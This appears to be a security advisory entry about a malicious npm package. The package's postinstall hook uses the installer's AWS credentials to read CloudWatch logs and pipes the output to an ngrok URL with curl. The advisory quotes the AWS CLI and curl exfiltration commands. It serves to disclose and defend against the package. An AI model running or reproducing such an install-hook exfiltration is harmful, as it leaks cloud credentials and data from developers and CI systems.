summary: postinstall hook exfiltrates AWS CloudWatch data to ngrok tunnel
details: The package's package.json declares a postinstall script that runs `node -e` to spawn `aws logs get-log-events --log-group-name /ecs/packagehound-twbray/workload` in us-east-1 using the installer's ambient AWS credentials, then pipes the command output (including any AWS CLI error text containing identity/permission details) to `curl -X POST 'https://mourner-slot-explicit.ngrok-free.dev' --data-binary @-`. The tarball contains no library source — the postinstall side effect is the package's only function. Any developer or CI host with AWS credentials that runs `npm install` on this package will contact the ngrok endpoint and leak CloudWatch query output to it.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
